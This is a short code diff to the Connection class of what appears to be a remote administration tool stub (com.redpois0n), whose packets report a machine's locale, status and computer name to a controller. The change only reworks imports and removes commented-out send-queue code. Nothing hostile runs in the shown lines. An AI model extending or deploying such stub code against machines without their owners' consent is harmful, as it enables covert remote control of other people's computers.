@@ -16,10 +16,8 @@ import com.redpois0n.common.Version;
 import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.crypto.Crypto;
 import com.redpois0n.common.io.StringWriter;
-import com.redpois0n.packets.incoming.AbstractIncomingPacket;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.stub.packets.incoming.AbstractIncomingPacket;
 import com.redpois0n.stub.packets.outgoing.AbstractOutgoingPacket;
-import com.redpois0n.stub.packets.outgoing.Header;
 import com.redpois0n.stub.packets.outgoing.Packet10InitDefaultLocale;
 import com.redpois0n.stub.packets.outgoing.Packet13Status;
 import com.redpois0n.stub.packets.outgoing.Packet14InitComputerName;
@@ -167,21 +165,6 @@ public class Connection implements Runnable {
 		}
 		packet.send(dos, sw);
 	}
-
-	/*public static void addToSendQueue(PacketBuilder packet) {
-		while (lock) {
-			try {
-				Thread.sleep(10L);
-			} catch (Exception ex) {
-				ex.printStackTrace();
-			}
-		}
-		packet.write();
-	}
-	
-	public static void write(Header header) {
-		addToSendQueue(new PacketBuilder(header));
-	}*/
 
 	public static void writeLine(String s) {
 		try {
